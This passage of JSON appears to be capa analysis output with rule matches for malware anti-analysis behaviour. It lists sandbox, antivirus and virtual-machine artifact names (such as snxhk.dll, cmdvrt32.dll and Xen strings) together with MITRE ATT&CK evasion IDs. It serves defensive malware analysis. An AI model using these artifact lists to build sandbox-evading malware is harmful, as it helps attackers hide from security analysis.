                      "description": "AVG"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/avghooka\\.dll/i",
                      "description": "AVG"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/snxhk\\.dll/i",
                      "description": "Avast"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/pstorec\\.dll/i",
                      "description": "SunBelt Sandbox"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/vmcheck\\.dll/i",
                      "description": "Virtual PC"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/wpespy\\.dll/i",
                      "description": "WPE Pro"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/cmdvrt64\\.dll/i",
                      "description": "Comodo Container"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/cmdvrt32\\.dll/i",
                      "description": "Comodo Container"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/sample\\.exe/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/bot\\.exe/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/sandbox\\.exe/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/malware\\.exe/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/test\\.exe/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/klavme\\.exe/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/myapp\\.exe/i"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "file",
                      "value": 20850
                    }
                  ],
                  "captures": {
                    "myaPp.exe": [
                      {
                        "type": "file",
                        "value": 20850
                      }
                    ]
                  }
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/testapp\\.exe/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "reference anti-VM strings targeting Xen": {
        "meta": {
          "name": "reference anti-VM strings targeting Xen",
          "namespace": "anti-analysis/anti-vm/vm-detection",
          "authors": [
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "file",
            "dynamic": "file"
          },
          "attack": [
            {
              "parts": [
                "Defense Evasion",
                "Virtualization/Sandbox Evasion",
                "System Checks"
              ],
              "tactic": "Defense Evasion",
              "technique": "Virtualization/Sandbox Evasion",
              "subtechnique": "System Checks",
              "id": "T1497.001"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Anti-Behavioral Analysis",
                "Virtual Machine Detection"
              ],
              "objective": "Anti-Behavioral Analysis",
              "behavior": "Virtual Machine Detection",
              "method": "",
              "id": "B0009"
            }
          ],
          "references": [
            "https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM/Xen.cpp"
          ],
          "examples": [
            "al-khaser_x86.exe_"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: reference anti-VM strings targeting Xen\r\n    namespace: anti-analysis/anti-vm/vm-detection\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: file\r\n      dynamic: file\r\n    att&ck:\r\n      - Defense Evasion::Virtualization/Sandbox Evasion::System Checks [T1497.001]\r\n    mbc:\r\n      - Anti-Behavioral Analysis::Virtual Machine Detection [B0009]\r\n    references:\r\n      - https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM/Xen.cpp\r\n    examples:\r\n      - al-khaser_x86.exe_\r\n  features:\r\n    - or:\r\n      - string: /^Xen/i\r\n      - string: /XenVMMXenVMM/i\r\n      - string: /xenservice\\.exe/i\r\n      - string: /HVM domU/i\r\n",
        "matches": [
          [
            {
              "type": "no address"
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/^Xen/i"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "file",
                      "value": 1317952
                    },
                    {
                      "type": "file",
                      "value": 2649503
                    }
                  ],
                  "captures": {
                    "xeNs": [
                      {
                        "type": "file",
                        "value": 1317952
                      }
                    ],
                    "XEno": [
                      {
                        "type": "file",
                        "value": 2649503
                      }
                    ]
                  }
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/XenVMMXenVMM/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/xenservice\\.exe/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "regex",
                      "regex": "/HVM domU/i"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      }
    }
  },
  "MITRE ATT&CK": [
    "T1027",
    "T1129",
    "T1497.001"
  ]
}